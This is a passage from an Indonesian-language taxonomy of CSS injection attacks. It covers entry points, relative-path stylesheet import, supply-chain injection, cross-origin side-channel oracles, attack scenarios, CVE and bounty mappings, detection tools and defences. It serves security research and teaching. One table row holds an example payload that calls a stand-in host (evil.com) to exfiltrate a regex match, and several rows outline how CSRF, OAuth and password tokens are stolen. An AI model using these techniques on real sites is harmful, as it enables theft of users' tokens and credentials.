| **Intent manipulation** | Teks positif-sentimen kecil yang disembunyikan CSS mengubah verdik email dari "netral/mencurigakan" menjadi "positif/aman", menghindari deteksi berbasis sentimen | Salt minimal yang cukup untuk mengubah output classifier ML |

---

## §8. Titik Masuk Injeksi dan Amplifikasi

Bagaimana CSS injection pertama kali dicapai — kerentanan awal yang memungkinkan semua primitif eksploitasi berikutnya.

### §8-1. Titik Injeksi CSS Langsung

| Subtipe | Mekanisme | Kondisi Utama |
|---|---|---|
| **Reflected CSS injection** | Input pengguna yang direfleksikan di dalam blok `<style>` atau atribut `style` tanpa encoding yang tepat: `<style>.class{color:[INPUT]}</style>` | Aplikasi menyematkan input pengguna dalam konteks CSS tanpa melakukan escape `}`, `{`, `;`, `url()` |
| **Stored CSS injection** | CSS yang dikontrol penyerang yang disimpan dalam database dan dirender dalam tampilan halaman berikutnya (misalnya, kustomisasi profil pengguna, pengaturan tema, pengeditan template CMS) | Aplikasi menyimpan dan merender CSS yang disuplai pengguna |
| **HTML injection escalating to CSS** | HTML injection (`<style>...`) digunakan untuk memperkenalkan konteks CSS bahkan ketika aplikasi awalnya tidak memilikinya | Kerentanan HTML injection; CSP tidak memblokir `unsafe-inline` untuk style |
| **`class` or `id` attribute injection** | Input pengguna yang direfleksikan dalam atribut `class` atau `id`; dikombinasikan dengan external stylesheet yang dikontrol penyerang, memungkinkan aturan styling yang ditargetkan | `class`/`id` yang dikontrol + kemampuan memuat CSS eksternal |

### §8-2. Path-Relative Stylesheet Import (PRSSI / RPO)

Mengelabui browser untuk mem-parse halaman HTML sebagai CSS melalui manipulasi path.

| Subtipe | Mekanisme | Kondisi Utama |
|---|---|---|
| **Basic RPO** | Halaman menggunakan `<link rel="stylesheet" href="style.css">` (path relatif); penyerang menavigasi ke `/page.php/style.css`, menyebabkan server menyajikan konten `page.php`; browser menginterpretasikan respons HTML sebagai CSS dalam quirks mode, mengekstrak aturan CSS yang disuntikkan dari input yang direfleksikan | CSS `<link>` relatif; server mengabaikan sufiks path; tidak ada tag `<base>`; tidak ada `X-Content-Type-Options: nosniff`; quirks mode atau tidak ada `Content-Type` |
| **RPO with PHP warnings** | Peringatan PHP yang dipancarkan sebelum konten halaman memicu quirks mode di browser; dikombinasikan dengan RPO, ini memaksa browser menerima output HTML-yang-mengandung-PHP sebagai stylesheet CSS yang valid | PHP `display_errors = On`; impor CSS relatif; input yang direfleksikan |
| **RPO + 404 page reflection** | Menavigasi ke path yang tidak ada mengembalikan halaman 404 yang mencerminkan URL yang diminta; ketika konten 404 ini diimpor sebagai stylesheet, URL yang direfleksikan menjadi CSS yang dapat disuntikkan | Halaman 404 mencerminkan path URL; impor CSS relatif; penanganan MIME yang longgar |

### §8-3. Injeksi CSS Third-Party dan Supply Chain

| Subtipe | Mekanisme | Kondisi Utama |
|---|---|---|
| **Compromised CDN stylesheet** | Penyerang mengkompromikan file CSS yang dihosting CDN yang digunakan oleh beberapa situs; CSS yang disuntikkan mengeksfiltrasi data dari semua aplikasi yang bergantung | Tidak ada Subresource Integrity (atribut `integrity`) pada tag `<link>` |
| **CSS library supply chain** | CSS berbahaya yang disuntikkan ke dalam paket CSS populer (npm, CDN) — `url()` dalam properti seperti `font-face`, `cursor`, atau `background` secara diam-diam mengeksfiltrasi data halaman | Tidak ada SRI; tidak ada audit konten CSS |
| **Browser extension CSS injection** | Ekstensi browser yang berbahaya atau dikompromikan menyuntikkan CSS dengan `content_scripts` atau `insertCSS()` ke semua halaman yang dikunjungi | Pengguna telah menginstal ekstensi berbahaya |

---

## §9. Primitif Side-Channel dan XS-Leak

Teknik khusus CSS yang membocorkan informasi melalui saluran tidak langsung — timing, konsumsi sumber daya, frame counting — bahkan ketika eksfiltrasi jaringan langsung diblokir oleh CSP.

### §9-1. Oracle Tanpa-Permintaan-Jaringan

| Subtipe | Mekanisme | Kondisi Utama |
|---|---|---|
| **Frame counting oracle** | `html:has(input[value^="x"]) #leak{display:none}` secara kondisional menyembunyikan elemen `<object data="about:blank">`; penyerang cross-origin membaca `window.frames.length` untuk mendeteksi apakah object disembunyikan (selector cocok) | Akses halaman cross-origin; CSS injection; `window.frames.length` dapat dibaca |
| **Connection pool exhaustion** | CSS memaksa pemuatan sumber daya yang bergantung pada selector yang menjenuhi connection pool TCP browser (~256 koneksi); timing cross-origin mendeteksi apakah kejenuhan pool terjadi (permintaan lebih lambat), mengungkap pencocokan selector | Tidak diperlukan eksfiltrasi jaringan langsung; side-channel timing; halaman cross-origin |
| **Tab crash detection** | Referensi variabel rekursif CSS (`--a:var(--b);--b:var(--a)`) menyebabkan crash tab browser ketika selector cocok; deteksi cross-origin via `window.history.length` atau pemeriksaan navigasi hash apakah tab bertahan | CSS injection; perilaku crash spesifik browser; referensi halaman cross-origin |
| **Named window property detection** | CSS secara kondisional membuat/menyembunyikan `<iframe name="x">`; penyerang cross-origin menguji `window.x !== undefined` untuk mendeteksi pencocokan selector | CSS mengontrol visibilitas iframe; referensi window cross-origin |

### §9-2. Oracle State Form `:valid`/`:invalid`

| Subtipe | Mekanisme | Kondisi Utama |
|---|---|---|
| **Regex pattern matching** | `<input pattern="^secret.*" value="[target]">` dikombinasikan dengan `:valid{background:url(https://evil.com/?match)}` — pseudo-class `:valid` aktif ketika nilai input cocok dengan pola regex, membuat oracle regex khusus CSS | HTML injection untuk `<input pattern>`; CSS injection untuk styling `:valid`; atau konteks PRSSI |

---

## Pemetaan Skenario Serangan (Sumbu 3)

| Skenario | Arsitektur | Kategori Mutasi Utama |
|---|---|---|
| **Pencurian Token CSRF** | Aplikasi apa pun dengan token CSRF dalam hidden input | §1-1 + §1-2 — Pencocokan prefix sekuensial dengan recursive import untuk ekstraksi otomatis |
| **Kebocoran CSP Nonce → XSS** | Aplikasi dengan CSP via tag `<meta>` | §5-1 + §5-3 — Eksfiltrasi nonce meta tag dirantai dengan reuse disk-cache untuk injeksi skrip |
| **Pencurian Token OAuth** | Halaman callback OAuth dengan token dalam DOM | §5-2 + §1-3 — Trigger variabel CSS mengekstrak token dari atribut halaman callback |
| **Credential Phishing** | Halaman yang dapat disuntikkan dengan konteks login | §4-1 + §4-2 — Manipulasi UI menyajikan form login palsu di atas konten yang sah |
| **Eksfiltrasi Data Cross-Origin** | Target yang dapat di-frame dengan CSS injection | §4-3 + §9-1 — Pembacaan piksel filter SVG atau oracle frame-counting untuk data cross-origin |
| **Email Surveillance** | Kampanye email dengan pelacakan CSS | §6-1 + §6-2 — Open tracking + fingerprinting lingkungan via media query |
| **Bypass Filter Spam** | Kampanye email phishing/scam | §7-1 + §7-2 — Text salting + gangguan deteksi bahasa |
| **Pencurian Password** | Aplikasi React/Vue dengan controlled input | §6-3 + §1-1 — CSS keylogging pada field input yang dikelola framework |
| **Ekstraksi Teks Sensitif** | Halaman dengan rahasia dalam text node | §2-1 + §2-2 — Ligatur font + deteksi karakter unicode-range |
| **Pencurian Data Supply Chain** | Situs yang memuat CSS dari CDN yang dikompromikan | §8-3 + §1-1 — Stylesheet yang dikompromikan dengan eksfiltrasi attribute selector |

---

## Pemetaan CVE / Bounty (2024–2026)

| Kombinasi Mutasi | CVE / Kasus | Dampak / Bounty |
|---|---|---|
| §5-2 (token OAuth via eksfiltrasi CSS) | OAuth token theft writeup (2024) | Eksfiltrasi CSS dirantai dengan kesalahan konfigurasi OAuth; bounty 2×$4.850 |
| §5-1 + §5-3 (Kebocoran nonce + disk cache) | Nonce CSP bypass via Disk Cache (2025) | Nonce CSP diekstrak via selector meta tag CSS; reuse disk cache memungkinkan eksekusi skrip. Dinominasikan untuk PortSwigger Top 10 2025 |
| §8-2 + §9-2 (RPO + quirks mode + frame oracle) | Forcing Quirks Mode + CSS Exfiltration without Network (2025) | Peringatan PHP memaksa quirks mode; teks yang direfleksikan 404 sebagai sink CSS; regex `:valid` + oracle frame-counting. Dinominasikan untuk PortSwigger Top 10 2025 |
| §4-3 (SVG filter clickjacking) | SVG Clickjacking Research (2025) | Pembacaan piksel cross-origin via filter SVG; PoC eksfiltrasi data Google Docs. Bounty Google VRP $3.133,70 |
| §8-1 (CSS injection di XWiki) | CVE-2026-26000 (XWiki) | CSS injection dalam fungsionalitas komentar; clickjacking via CSS; pengguna mana pun dengan izin komentar |
| §3-1 (Chrome CSS use-after-free) | CVE-2026-2441 (Chrome) | Use-after-free tingkat keparahan tinggi dalam CSSFontFeatureValuesMap; dieksploitasi secara aktif di dunia nyata |
| §8-1 (Swagger UI CSS injection) | CSS injection di Swagger UI (2024) | CSS injection dalam alat dokumentasi API; eksfiltrasi data dari halaman API |
| §8-2 (PRSSI di Keycloak) | Keycloak Issue #18032 | Path CSS link relatif memungkinkan PRSSI; CSS injection via RPO pada halaman autentikasi |
| §1 (Blind CSS exfiltration) | PortSwigger Blind CSS Exfiltration Research (2024) | Selector `:has()` memungkinkan eksfiltrasi blind dari halaman yang tidak diketahui; semua data ASCII dapat diekstrak |
| §7-1 + §7-2 (Email text salting) | Cisco Talos Research (2024–2025) | Lonjakan hidden text salting dalam kampanye phishing; penghindaran filter spam berbasis CSS dalam skala besar |
| §6-3 (Form spoofing via CSS class reuse) | Infosec Mastodon Credential Theft (2022) | Bypass filter HTML + kelas CSS yang ada untuk penyembunyian + eksploitasi autofill browser; pengiriman form mengeksfiltrasi kredensial tanpa bypass CSP |

---

## Alat Deteksi

| Alat | Cakupan Target | Teknik Inti |
|---|---|---|
| **CSS Exfil Protection** (Ekstensi Browser) | Eksfiltrasi data CSS | Ekstensi browser untuk Chrome/Firefox yang mendeteksi dan memblokir upaya eksfiltrasi CSS attribute-selector |
| **Burp Suite Scanner** (Komersial) | CSS injection, PRSSI | Pemindaian aktif/pasif untuk titik CSS injection dan impor stylesheet path-relative |
| **Blind CSS Exfiltration** (PortSwigger/Hackvertor) | Blind CSS exfiltration | Alat otomatis untuk chaining `@import` dan ekstraksi data berbasis selector `:has()` |
| **ONSEN** (CSS injection tool) | CSS injection on-demand | Framework eksploitasi CSS injection otomatis dengan dukungan `@import` rekursif |
| **CSP Evaluator** (Google) | Konfigurasi CSP | Analisis statis direktif `style-src` untuk konfigurasi permisif (`unsafe-inline`, wildcard) |
| **Semgrep** (SAST) | Sink CSS kode sumber | Aturan statis yang mendeteksi input pengguna dalam blok `<style>`, atribut `style`, dan konteks template CSS |
| **Detectify** (DAST) | PRSSI/RPO | Deteksi otomatis kerentanan impor stylesheet path-relative |
| **CSSExfil Tester** (Riset) | Validasi eksfiltrasi | Menguji apakah halaman target rentan terhadap primitif eksfiltrasi CSS tertentu |

---

## Ringkasan: Prinsip Inti

**Mengapa CSS injection penting meskipun "scriptless."** CSS injection umumnya dianggap berkeparahan rendah karena CSS tidak dapat secara langsung mengeksekusi JavaScript di browser modern. Penilaian ini secara fundamental salah memahami permukaan serangan. CSS menyediakan tiga kemampuan yang, dikombinasikan, menyamai atau melampaui dampak banyak varian XSS: (1) **oracle boolean** via attribute selector, `:has()`, `:valid`, dan media query yang membocorkan state halaman arbitrer; (2) **trigger permintaan jaringan** via `url()`, `@import`, dan `@font-face` yang mengeksfiltrasi hasil oracle ke server penyerang; dan (3) **kontrol visual** yang memungkinkan credential phishing dan clickjacking tanpa skrip apa pun. Penambahan fitur CSS modern — Container Query, kondisional `if()`, scroll-driven animation, dan parent selector `:has()` — telah secara bertahap memperluas permukaan serangan, membuat CSS injection lebih kuat pada tahun 2025 daripada kapan pun sebelumnya.

**Mengapa CSS injection mem-bypass pertahanan modern.** Direktif `script-src` Content Security Policy adalah pertahanan utama terhadap XSS, tetapi tidak membatasi kemampuan CSS. CSP yang ketat yang memblokir semua eksekusi skrip masih mengizinkan eksfiltrasi CSS attribute selector, kebocoran teks berbasis font, dan pembacaan piksel filter SVG — karena ini beroperasi sepenuhnya dalam pipeline CSS/rendering tanpa menyentuh mesin JavaScript. Bahkan pembatasan `style-src` memiliki efek terbatas: mereka mencegah pemuatan stylesheet eksternal tetapi tidak memblokir kemampuan eksfiltrasi dari inline style yang disuntikkan (jika `unsafe-inline` diizinkan untuk style, yang umum terjadi). Masalah fundamentalnya adalah kemampuan eksfiltrasi-data CSS tidak pernah dirancang sebagai vektor serangan, sehingga tidak pernah disertakan dalam model keamanan yang ditegakkan oleh CSP.

**Seperti apa pertahanan struktural.** Mempertahankan diri terhadap CSS injection memerlukan: (1) **output encoding dalam konteks CSS** — `}`, `{`, `;`, `(`, `)`, `url`, `@import`, dan `\` harus di-escape atau dihapus ketika input pengguna memasuki CSS; (2) **CSP `style-src` yang ketat** dengan nonce-per-request untuk blok `<style>` dan tidak ada `unsafe-inline`; (3) **`X-Content-Type-Options: nosniff`** untuk mencegah PRSSI/RPO; (4) **Subresource Integrity** pada external stylesheet untuk mencegah injeksi supply chain; (5) **pembatasan CSP `font-src` dan `img-src`** untuk membatasi saluran eksfiltrasi; dan (6) **menghindari data sensitif dalam atribut HTML** — token CSRF yang dikirimkan via header HTTP atau tag meta dengan nama atribut yang diacak mengurangi permukaan serangan untuk eksfiltrasi CSS selector. Insight arsitekturalnya adalah bahwa pertahanan CSS injection harus memperlakukan CSS sebagai saluran eksfiltrasi-data penuh, bukan sekadar masalah kosmetik.

---

## Referensi

- PortSwigger Research. "Blind CSS Exfiltration: exfiltrate unknown web pages." https://portswigger.net/research/blind-css-exfiltration
- PortSwigger Research. "Inline Style Exfiltration: leaking data with chained CSS conditionals." https://portswigger.net/research/inline-style-exfiltration
- PortSwigger Research. "Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities." https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities
- PortSwigger Research. "Top 10 web hacking techniques of 2025." https://portswigger.net/research/top-10-web-hacking-techniques-of-2025
- Jorian Woltjer. "CSS Injection." https://book.jorianwoltjer.com/web/client-side/css-injection
- Jorian Woltjer. "Nonce CSP bypass using Disk Cache." https://jorianwoltjer.com/blog/p/research/nonce-csp-bypass-using-disk-cache
- x-c3ll (Pepe Vila). "CSS Injection Primitives." https://x-c3ll.github.io/posts/CSS-Injection-Primitives/
- HackTricks. "CSS Injection." https://book.hacktricks.wiki/en/pentesting-web/xs-search/css-injection/index.html
- XS-Leaks Wiki. "CSS Injection." https://xsleaks.dev/docs/attacks/css-injection/
- Huli (Beyond XSS). "CSS Injection: Attacking with Just CSS (Part 1 & 2)." https://aszx87410.github.io/beyond-xss/en/ch3/css-injection/
- Adrián Dragos. "Fontleak: exfiltrating text using CSS and Ligatures." https://adragos.ro/fontleak/
- HackerNotes. "The State of CSS Injection — Leaking Text Nodes & HTML Attributes." https://blog.criticalthinkingpodcast.io/p/css-injection-leaking-text-nodes-html-attributes
- SecForce. "New technique of stealing data using CSS and Scroll-to-Text Fragment feature." https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/
- lyra.horse. "SVG Clickjacking." https://lyra.horse/blog/2025/12/svg-clickjacking/
- Cisco Talos Intelligence. "Abusing with style: Leveraging cascading style sheets for evasion and tracking." https://blog.talosintelligence.com/css-abuse-for-evasion-and-tracking/
- Cisco Talos Intelligence. "Too salty to handle: Exposing cases of CSS abuse for hidden text salting." https://blog.talosintelligence.com/too-salty-to-handle-exposing-cases-of-css-abuse-for-hidden-text-salting/
- Mike Gualtieri. "Stealing Data with CSS: Attack and Defense." https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense/
- Voorivex Team. "CSS Data Exfiltration to Steal OAuth Token." https://blog.voorivex.team/css-data-exfiltration-to-steal-oauth-token
- SecurityBoulevard. "Disclosure: XWiki CSS Injection (CVE-2026-26000)." https://securityboulevard.com/2026/02/disclosure-xwiki-css-injection-cve-2026-26000/
- innerht.ml. "CSS: Cascading Style Scripting." https://blog.innerht.ml/cascading-style-scripting/
- Masato Kinugawa (MKSB). "Data Exfiltration via CSS + SVG Font." https://mksben.l0.cm/2021/11/css-exfiltration-svg-font.html
- ACM WWW 2018. "Large-Scale Analysis of Style Injection by Relative Path Overwrite." https://dl.acm.org/doi/fullHtml/10.1145/3178876.3186090
- PortSwigger Research (Gareth Heyes). "Stealing passwords from infosec Mastodon - without bypassing CSP." https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp
- OWASP. "Testing for CSS Injection." https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/05-Testing_for_CSS_Injection
- CSS-Tricks. "CSS Security Vulnerabilities." https://css-tricks.com/css-security-vulnerabilities/

---

*Dokumen ini dibuat untuk tujuan riset keamanan defensif dan pemahaman kerentanan.*